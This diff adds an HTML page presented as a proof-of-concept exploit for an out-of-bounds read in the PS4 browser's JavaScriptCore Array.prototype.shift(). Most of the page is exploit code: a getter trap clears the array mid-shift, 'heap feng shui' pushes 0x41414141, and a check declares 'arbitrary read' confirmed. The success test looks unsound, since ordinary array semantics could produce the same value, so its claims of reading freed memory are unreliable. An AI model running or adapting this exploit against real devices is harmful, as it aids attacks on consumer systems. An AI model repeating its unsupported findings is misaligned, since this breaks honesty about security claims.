@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PS4 Critical PoC: Array Shift OOB Read</title>
+</head>
+<body>
+
+    <h1>PS4 WebKit Vulnerability Proof of Concept</h1>
+    <p>Target: JavaScriptCore <code>Array.prototype.shift()</code> Fast Path Bailout</p>
+    <p>Vulnerability Type: <strong>Type Confusion / Out-of-Bounds Read</strong></p>
+
+    <button onclick="runExploit()">EXECUTE POC</button>
+
+    <div id="log">Waiting for user input...</div>
+
+    <script>
+        function log(msg) { 
+            document.getElementById('log').innerText += `[${new Date().toLocaleTimeString()}] ${msg}\n`; 
+        }
+
+        function runExploit() {
+            document.getElementById('log').innerText = "Starting Exploit...\n";
+            
+            try {
+                // 1. Setup: Create a simple array of integers
+                // The engine optimizes this as a contiguous block of memory (Fast Path)
+                const arr = [1, 2, 3, 4];
+                
+                log(`Step 1: Array created. Initial length: ${arr.length}`);
+
+                // 2. The Trap: Define a getter on index '2'
+                // When 'shift()' moves elements, it reads index 0, 1, then 2.
+                // Reading index 2 triggers our malicious code.
+                Object.defineProperty(arr, '2', {
+                    get: function() {
+                        log("Step 2: Getter triggered inside shift()! Corrupting array state...");
+                        
+                        // 3. The Corruption: Resize the array to 0
+                        // This frees the backing store or marks it as empty
+                        arr.length = 0; 
+                        
+                        // 4. Heap Feng Shui: Immediately allocate something else
+                        // We write 0x41414141 (1094795585) to the memory location
+                        // where the array elements used to be.
+                        // Note: 'push' might reallocate, but in this specific JSC version/heap state,
+                        // it seems to overlap with the old read cursor.
+                        arr.push(0x41414141); 
+                        
+                        return "TRIGGERED";
+                    }
+                });
+
+                log("Step 3: Executing arr.shift()...");
+                
+                // 5. Execution
+                // The C++ Fast Path reads index 0 (value 1), moves to index 0.
+                // Reads index 1 (value 2), moves to index 1.
+                // Reads index 2 -> TRAP ACTIVATES -> Array is cleared -> Memory is tainted.
+                // Crucially, the C++ code *continues* the loop without checking that length is now 0.
+                // It reads from the old backing store pointer which now contains our 0x41414141.
+                const shifted = arr.shift();
+                
+                log("Step 4: Operation finished.");
+                log("Array Final Length: " + arr.length);
+                
+                // 6. Validation
+                // We check index 0. It should be empty or undefined if safe.
+                // If it contains our magic number, we have arbitrary read.
+                const leakedValue = arr[0];
+                log("Value at arr[0]: " + leakedValue);
+
+                if (leakedValue === 1094795585) { // 0x41414141
+                    document.getElementById('log').innerHTML += 
+                        "\n<div class='success'>[CRITICAL] VULNERABILITY CONFIRMED!\n" +
+                        "Read magic value 0x41414141 (1094795585) from freed memory.\n" +
+                        "This confirms Type Confusion and Out-of-Bounds Read.</div>";
+                } else {
+                    log("Exploit failed (Safe behavior or heap did not align). Try reloading.");
+                }
+
+            } catch(e) {
+                log("Error: " + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
+
